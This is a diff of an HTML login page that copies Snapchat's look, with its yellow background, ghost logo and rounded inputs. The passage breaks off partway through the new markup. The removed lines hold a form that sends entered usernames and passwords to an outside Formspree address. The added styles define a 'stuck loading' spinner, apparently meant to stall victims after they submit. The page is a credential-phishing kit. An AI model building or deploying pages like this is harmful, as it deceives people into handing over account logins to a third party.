@@ -1,24 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello - Login</title>
+    <style>
+        :root {
+            --snap-yellow: #FFFC00;
+            --snap-blue: #00ADFF;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: var(--snap-yellow);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .login-box {
+            text-align: center;
+            width: 100%;
+            max-width: 320px;
+            padding: 20px;
+        }
+
+        /* Snapchat Ghost Logo */
+        .ghost-logo {
+            width: 70px;
+            height: 70px;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            color: #000;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 12px;
+            border: 1px solid #ddd;
+            border-radius: 25px;
+            box-sizing: border-box;
+            font-size: 14px;
+            outline: none;
+            background: #fff;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 15px;
+            background-color: var(--snap-blue);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        /* Stuck Loading Style */
+        #loading-screen {
+            display: none;
+            text-align: center;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-msg {
+            font-weight: bold;
+            color: #333;
+            font-size: 18px;
+        }
+    </style>
 </head>
 <body>
-    <div class="login-container" id="login-box">
-        <svg class="ghost-icon" viewBox="0 0 100 100">
-            <path d="M50 15c-15 0-22 10-22 22 0 4 1 8 3 11-2 1-4 4-4 7 0 4 2 6 4 6-1 4-2 8-2 12 0 7 8 11 20 11s20-4 20-11c0-4-1-8-2-12 2 0 4-2 4-6 0-3-2-6-4-7 2-3 3-7 3-11 0-12-7-22-20-22z" fill="white" stroke="black" stroke-width="2"/>
-        </svg>
-        <h1>Hello</h1>
-        <form id="loginForm" action="https://formspree.io/f/xbdlnrge" method="POST">
-            <input type="text" name="username" placeholder="Username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit" class="login-btn">Log In</button>
-        </form>
-    </div>
-    <div id="loading-screen" style="display:none;">
-        <div class="spinner"></div>
-        <p>Loading...</p>
-    </div>
-    <script src="script.js"></script>
-</body>
-</html>
+
+    <div class="login-box" id="login-ui">
+        <svg class="ghost-logo" viewBox="0 0 100 100">
+            <path d="M50 15c-15 0-22 10-22 22 0 4 1 8 3 11-2 1-4 4-4 7 0 4 2 6 4 6-1 4-2 8-2 12 0 7 8 11 20 11s20-4 20-11c0-4-1-8-2-12 2 0 4-2 4-6 0-3-2-6-4-7 2-3 3-7 3-11 0-12-7-2
